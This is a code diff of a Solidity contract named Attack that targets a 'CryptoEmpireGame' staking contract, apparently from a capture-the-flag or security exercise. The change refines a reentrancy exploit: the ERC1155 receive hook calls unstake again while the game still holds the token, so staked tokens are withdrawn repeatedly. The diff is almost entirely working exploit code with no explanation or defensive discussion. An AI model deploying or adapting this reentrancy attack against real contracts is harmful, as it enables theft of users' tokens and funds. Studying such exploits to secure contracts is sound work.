@@ -19,7 +19,7 @@ contract Attack {
 
     ICryptoEmpireGame game;
     address private owner;
-    uint8 private reentrant = 0;
+    bool private tokenTransfered = false;
 
     constructor(address _game) {
         owner = msg.sender;
@@ -30,10 +30,8 @@ contract Attack {
         require(owner == msg.sender, "not owner");
         console.log("attack");
         game.cryptoEmpireToken().setApprovalForAll(address(game), true);
-        for (uint8 i = 0; i < 20; i++) {
-            game.stake(2);
-            game.unstake(2);
-        }
+        game.stake(2);
+        game.unstake(2);
     }
 
     function onERC1155Received(
@@ -43,12 +41,15 @@ contract Attack {
         uint256,
         bytes calldata 
     ) external returns (bytes4) {
-        reentrant += 1;
-
-        if (reentrant % 2 == 0) {
-            game.unstake(2);
+        if (!tokenTransfered) {
+            tokenTransfered = true;
+            return this.onERC1155Received.selector;
         }
 
+        require(msg.sender == address(game.cryptoEmpireToken()));
+        if (game.cryptoEmpireToken().balanceOf(address(game), 2) > 0) {
+            game.unstake(2);
+        }
         return this.onERC1155Received.selector;
     }
 
